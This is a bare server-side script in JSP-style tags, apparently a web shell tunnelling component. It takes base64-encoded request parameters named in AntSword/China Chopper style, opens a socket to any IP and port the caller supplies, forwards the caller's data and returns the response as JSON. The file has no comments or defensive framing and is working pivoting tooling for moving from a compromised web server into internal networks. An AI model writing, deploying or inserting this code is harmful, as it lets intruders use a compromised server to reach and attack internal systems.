<%
(function() {
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");

    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode_str(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    function base64_decode_bytes(str) {
        if (!str) return null;
        try {
            var decoder = java.util.Base64.getDecoder();
            return decoder.decode(str);
        } catch (e) {
            return null;
        }
    }

    function base64_encode_bytes(bytes) {
        if (!bytes || bytes.length === 0) return "";
        try {
            var encoder = java.util.Base64.getEncoder();
            return encoder.encodeToString(bytes);
        } catch (e) {
            return "";
        }
    }

    var z0 = request.getParameter("z0");
    if (!z0)
        return;

    var action = base64_decode_str(z0);

    if (action === "forward") {
        var z2 = request.getParameter("z2");
        var z3 = request.getParameter("z3");
        var z4 = request.getParameter("z4");
        if (!z2 || !z3 || !z4) return;

        var target_ip = base64_decode_str(z2);
        var target_port = java.lang.Integer.parseInt(base64_decode_str(z3));
        
        var dataBytes = base64_decode_bytes(base64_decode_str(z4));

        var socket = null;
        var outStream = null;
        var inStream = null;

        try {
            socket = new java.net.Socket();
            var socketAddress = new java.net.InetSocketAddress(target_ip, target_port);
            socket.connect(socketAddress, 3000);
            
            socket.setSoTimeout(500);

            outStream = socket.getOutputStream();
            inStream = socket.getInputStream();

            if (dataBytes !== null && dataBytes.length > 0) {
                outStream.write(dataBytes);
                outStream.flush();
            }

            var responseMS = new java.io.ByteArrayOutputStream();
            var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
            var retry = 0;

            while (retry < 3) {
                java.lang.Thread.sleep(50);

                var hasData = false;
                try {
                    while (inStream.available() > 0) {
                        var bytesRead = inStream.read(buffer);
                        if (bytesRead > 0) {
                            responseMS.write(buffer, 0, bytesRead);
                            hasData = true;
                        }
                    }
                } catch (readEx) {
                     
                }

                if (hasData && responseMS.size() > 0) {
                    break;
                }
                retry++;
            }

            var responseBytes = responseMS.toByteArray();
            output(JSON.stringify({
                "status": "success",
                "data": base64_encode_bytes(responseBytes)
            }));

        } catch (ex) {
            output(JSON.stringify({ "status": "error", "msg": ex.getMessage() }));
        } finally {
            if (outStream !== null) { try { outStream.close(); } catch(e){} }
            if (inStream !== null) { try { inStream.close(); } catch(e){} }
            if (socket !== null) { try { socket.close(); } catch(e){} }
        }
        return;
    }
})();
%>